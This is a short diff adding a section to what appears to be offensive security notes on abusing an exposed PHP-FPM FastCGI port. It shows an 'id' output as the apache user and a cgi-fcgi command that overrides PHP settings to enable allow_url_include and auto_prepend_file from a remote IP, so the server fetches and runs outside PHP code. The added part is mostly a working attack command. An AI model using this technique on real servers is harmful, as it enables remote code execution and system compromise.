@@ -47,3 +47,15 @@ uid=48(apache) gid=48(apache) groups=48(apache),993(nagios) context=system_u:sys
 echo "Hello World!";
 
 
+Using cgi-fcgi command line tool
+===========================================================
+
+yum install fcgi
+
+Remote file include: (example ip: 192.168.10.10)
+---
+SCRIPT_FILENAME=/path/to/some_file.php \
+REQUEST_METHOD=GET \
+PHP_ADMIN_VALUE="allow_url_include=1,auto_prepend_file=192.168.10.10/some_file.php" \
+cgi-fcgi -bind -connect 127.0.0.1:9000
+
